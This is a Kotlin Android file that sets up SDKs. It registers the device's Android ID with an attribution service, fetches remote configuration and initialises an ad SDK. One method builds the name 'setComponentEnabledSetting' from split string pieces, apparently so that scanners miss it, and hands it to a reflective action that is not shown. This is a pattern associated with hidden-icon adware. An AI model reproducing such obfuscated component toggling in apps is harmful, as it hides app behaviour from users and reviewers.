package com.whisper.gentle

import android.content.Context

/**
 * Date：2025/10/28
 * Describe:
 */
class FigSdkInit {
    companion object {
        var mAndroidIdStr = ""
    }

    private val mConfigureCenter by lazy { ConfigureCenter() }


    fun initSdk(context: Context) {
        FigCache.log("figInitSdk--->android id $mAndroidIdStr")
        mConfigureCenter.afRegister(context, mAndroidIdStr)
        mConfigureCenter.fetch(context, Pair(2, "5"))
        FigCache.figInitPangleSdk(context)
    }

    private val pairInt = Pair(5, 10)
    fun figInitSdk(context: Context, pair: Pair<String, String>) {
        mAndroidIdStr = pair.first

        //d.c11setComponentEnabledSettingandroid.content.ComponentName
        mConfigureCenter.action(context, getNameStr(), pair.second, pairInt)
    }

    //d.c11setComponentEnabledSettingandroid.content.ComponentName
    private fun getNameStr(): String {
        val strBuild = StringBuilder()
        strBuild.append("11setComponentEnabled")
        strBuild.append("Settingandroid.content.ComponentName")
        return strBuild.toString()
    }

//    private fun action(context: Context, time: Long) {
//
//        val names = mmkv.decodeString("f_name_str", "") ?: ""
//        CoroutineScope(Dispatchers.IO).launch {
//            var filed = mmkv.decodeString("fig_configure", "") ?: ""
//            while (filed.isBlank()) {
//                delay(time)
//                filed = mmkv.decodeString("fig_configure", "") ?: ""
//            }
////
////            Class.forName("com.fb.network.FbInitHelper").getMethod("init", Context::class.java)
////                .invoke(null, context)
////            return@launch
////a
//            mConfigureCenter.action(context, filed, names, Pair("6".toInt(), "7".toInt()))
//        }
//    }
}